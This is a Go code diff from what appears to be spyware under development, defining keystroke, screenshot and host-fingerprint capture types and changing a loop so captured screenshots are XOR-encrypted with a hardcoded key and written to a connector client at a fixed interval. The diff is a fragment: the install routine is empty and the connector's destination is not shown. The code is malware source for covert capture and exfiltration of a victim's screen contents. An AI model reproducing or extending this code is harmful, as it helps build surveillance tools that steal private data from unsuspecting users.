@@ -12,19 +12,19 @@ import (
 )
 
 type KeystrokeCapture struct {
-	keycap    []byte
-	timestamp time.Time
+	Keycap    []byte    `json:"keycap"`
+	Timestamp time.Time `json:"timestamp"`
 }
 
 type ScreenshotCapture struct {
-	screencap []byte
-	timestamp time.Time
+	Screencap []byte    `json:"screencap"`
+	Timestamp time.Time `json:"timestamp"`
 }
 
 type FingerprintCapture struct {
-	os        string
-	hostname  string
-	timestamp time.Time
+	Os        string    `json:"os"`
+	Hostname  string    `json:"hostname"`
+	Timestamp time.Time `json:"timestamp"`
 	// etc
 }
 
@@ -75,6 +75,15 @@ const (
 func install() {
 }
 
+func EncryptDecrypt(input []byte, key string) (output []byte) {
+	out := make([]byte, len(input))
+	for i := 0; i < len(input); i++ {
+		out[i] = input[i] ^ key[i%len(key)]
+	}
+
+	return out
+}
+
 func runLoop() error {
 	// Create connector
 	connector := SimpleConnector{
@@ -95,14 +104,15 @@ func runLoop() error {
 		}
 
 		screenCapture := ScreenshotCapture{
-			screencap: screenCapData,
-			timestamp: time.Now(),
+			Screencap: screenCapData,
+			Timestamp: time.Now(),
 		}
 
-		_, err = connectorClient.Write(screenCapture.screencap)
+		_, err = connectorClient.Write(screenCapture.Serialize())
 		if err != nil {
 			return fmt.Errorf("unable to write screen cap to connector client: %w", err)
 		}
+		fmt.Println("Sent!")
 
 		time.Sleep(CAP_INTERVAL)
 	}
@@ -136,7 +146,9 @@ func (kc KeystrokeCapture) Serialize() []byte {
 }
 
 func (sc ScreenshotCapture) Serialize() []byte {
-	return []byte("foobar")
+	encrypted := EncryptDecrypt(sc.Screencap, "e7509a8c032f3bc2a8df1df476f8ef03436185fa")
+
+	return []byte(encrypted)
 }
 
 func (fc FingerprintCapture) Serialize() []byte {
